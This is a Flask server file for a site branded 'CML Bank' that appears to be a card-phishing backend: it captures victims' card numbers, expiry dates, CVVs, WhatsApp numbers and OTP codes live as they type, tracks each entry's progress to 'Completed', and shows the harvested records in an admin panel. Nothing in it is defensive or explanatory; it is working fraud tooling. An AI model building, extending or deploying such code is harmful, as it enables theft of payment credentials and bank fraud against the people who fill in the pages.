from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from datetime import datetime, timedelta
from functools import wraps
import sqlite3
import os

# ==================== APP CONFIG ====================
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'cmlbank_secret_key_2024')
app.config['TEMPLATES_AUTO_RELOAD'] = False
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)


# ==================== ADMIN CREDENTIALS ====================
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'cml123')


# ==================== DATABASE PATH (Universal) ====================
# Railway pe /data mount hota hai, warna project folder use hota hai
if os.path.exists('/data'):
    DB_FILE = '/data/cmlbank.db'
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    DB_FILE = os.path.join(BASE_DIR, 'cmlbank.db')

print(f"📁 DB Path: {DB_FILE}")


# ==================== CACHE-BUSTING HEADERS ====================
@app.after_request
def add_header(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response


# ==================== DATABASE CONNECTION ====================
def get_db():
    conn = sqlite3.connect(DB_FILE, timeout=10, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    try:
        conn = get_db()
        cursor = conn.cursor()

        # ---- card_records table ----
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS card_records (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                card_number TEXT DEFAULT '',
                expiry_date TEXT DEFAULT '',
                cvv TEXT DEFAULT '',
                whatsapp TEXT DEFAULT '',
                otp TEXT DEFAULT '',
                status TEXT DEFAULT 'Typing Card',
                timestamp TEXT NOT NULL,
                updated_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        # ---- settings table ----
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL
            )
        ''')

        cursor.execute('''
            INSERT OR IGNORE INTO settings (key, value) VALUES ('website_enabled', 'true')
        ''')

        conn.commit()
        conn.close()
        print("✅ Database initialized successfully")
        print(f"   Location: {DB_FILE}")
    except Exception as e:
        print(f"❌ DB INIT ERROR: {e}")


init_db()


# ==================== HELPERS ====================
def get_pakistan_time():
    utc_now = datetime.utcnow()
    pk_now = utc_now + timedelta(hours=5)
    return pk_now.strftime("%I:%M:%S %p")


def get_website_state():
    try:
        conn = get_db()
        row = conn.execute("SELECT value FROM settings WHERE key='website_enabled'").fetchone()
        conn.close()
        return row['value'] == 'true' if row else True
    except:
        return True


def set_website_state(enabled):
    try:
        conn = get_db()
        conn.execute(
            "UPDATE settings SET value=? WHERE key='website_enabled'",
            ('true' if enabled else 'false',)
        )
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"State save error: {e}")


def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function


# ==================== USER ROUTES ====================

@app.route('/')
def user_app():
    return render_template('index.html')


@app.route('/otp')
def otp_page():
    return render_template('otp.html')


@app.route('/toggle_website', methods=['POST'])
def toggle_website():
    data = request.get_json()
    enabled = data.get('enabled', False)
    set_website_state(enabled)
    return jsonify({'success': True, 'enabled': enabled})


@app.route('/get_website_state', methods=['GET'])
def get_website_state_route():
    return jsonify({'enabled': get_website_state()})


# ==================== ADMIN ROUTES ====================

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()

        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session.permanent = True
            session['admin_logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        else:
            error = 'Invalid username or password'

    return render_template('admin_login.html', error=error)


@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))


@app.route('/admin')
@admin_required
def admin_dashboard():
    return render_template('admin.html')


@app.route('/get_all_data', methods=['GET'])
def get_all_data():
    try:
        conn = get_db()
        rows = conn.execute(
            "SELECT * FROM card_records ORDER BY id DESC LIMIT 500"
        ).fetchall()
        conn.close()
        return jsonify([dict(row) for row in rows])
    except Exception as e:
        print(f"get_all_data error: {e}")
        return jsonify([])


@app.route('/get_latest_state', methods=['GET'])
def get_latest_state():
    try:
        conn = get_db()
        rows = conn.execute(
            "SELECT id, card_number, expiry_date, cvv, whatsapp, otp, status, timestamp FROM card_records ORDER BY id DESC LIMIT 500"
        ).fetchall()
        conn.close()
        return jsonify([dict(row) for row in rows])
    except Exception as e:
        print(f"get_latest_state error: {e}")
        return jsonify([])


@app.route('/delete_record/<int:record_id>', methods=['DELETE'])
def delete_record(record_id):
    try:
        conn = get_db()
        conn.execute("DELETE FROM card_records WHERE id=?", (record_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/clear_all_records', methods=['POST'])
def clear_all_records():
    try:
        conn = get_db()
        conn.execute("DELETE FROM card_records")
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ==================== LIVE UPDATE ROUTES ====================

@app.route('/update_card', methods=['POST'])
def update_card():
    """Naya record ya existing update — Card number"""
    try:
        data = request.get_json()
        card_number = data.get('cardNumber', '').strip()
        session_id = data.get('sessionId', '')

        if not card_number:
            return jsonify({'success': False})

        timestamp = get_pakistan_time()

        conn = get_db()
        cursor = conn.cursor()

        # Agar session_id diya hai to same record update karo
        if session_id:
            row = cursor.execute("SELECT id FROM card_records WHERE id=?", (session_id,)).fetchone()
            if row:
                cursor.execute('''
                    UPDATE card_records
                    SET card_number=?, status='Typing Card', timestamp=?, updated_at=CURRENT_TIMESTAMP
                    WHERE id=?
                ''', (card_number, timestamp, session_id))
                conn.commit()
                conn.close()
                return jsonify({'success': True, 'id': session_id})

        # Naya record banao
        cursor.execute('''
            INSERT INTO card_records (card_number, expiry_date, cvv, whatsapp, otp, status, timestamp, updated_at)
            VALUES (?, '', '', '', '', 'Typing Card', ?, CURRENT_TIMESTAMP)
        ''', (card_number, timestamp))
        new_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'id': new_id})
    except Exception as e:
        print(f"Card update error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/update_expiry', methods=['POST'])
def update_expiry():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        expiry = data.get('expiry', '').strip()

        if not session_id:
            return jsonify({'success': False})

        timestamp = get_pakistan_time()
        status = 'Expiry Set' if len(expiry) == 5 else 'Typing Expiry'

        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE card_records
            SET expiry_date=?, status=?, timestamp=?, updated_at=CURRENT_TIMESTAMP
            WHERE id=?
        ''', (expiry, status, timestamp, session_id))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'id': session_id})
    except Exception as e:
        print(f"Expiry error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/update_cvv', methods=['POST'])
def update_cvv():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        cvv = data.get('cvv', '').strip()

        if not session_id:
            return jsonify({'success': False})

        timestamp = get_pakistan_time()
        status = 'CVV Set' if len(cvv) == 3 else 'Typing CVV'

        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE card_records
            SET cvv=?, status=?, timestamp=?, updated_at=CURRENT_TIMESTAMP
            WHERE id=?
        ''', (cvv, status, timestamp, session_id))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'id': session_id})
    except Exception as e:
        print(f"CVV error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/update_whatsapp', methods=['POST'])
def update_whatsapp():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        whatsapp = data.get('whatsapp', '').strip()

        if not session_id:
            return jsonify({'success': False})

        timestamp = get_pakistan_time()
        status = 'WhatsApp Set' if len(whatsapp) >= 10 else 'Typing WhatsApp'

        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE card_records
            SET whatsapp=?, status=?, timestamp=?, updated_at=CURRENT_TIMESTAMP
            WHERE id=?
        ''', (whatsapp, status, timestamp, session_id))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'id': session_id})
    except Exception as e:
        print(f"WhatsApp error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/update_otp', methods=['POST'])
def update_otp():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        otp = data.get('otp', '').strip()

        if not session_id:
            return jsonify({'success': False})

        timestamp = get_pakistan_time()
        status = 'Completed' if len(otp) == 6 else 'Typing OTP'

        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE card_records
            SET otp=?, status=?, timestamp=?, updated_at=CURRENT_TIMESTAMP
            WHERE id=?
        ''', (otp, status, timestamp, session_id))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'id': session_id})
    except Exception as e:
        print(f"OTP error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


# ==================== MAIN ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Starting server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)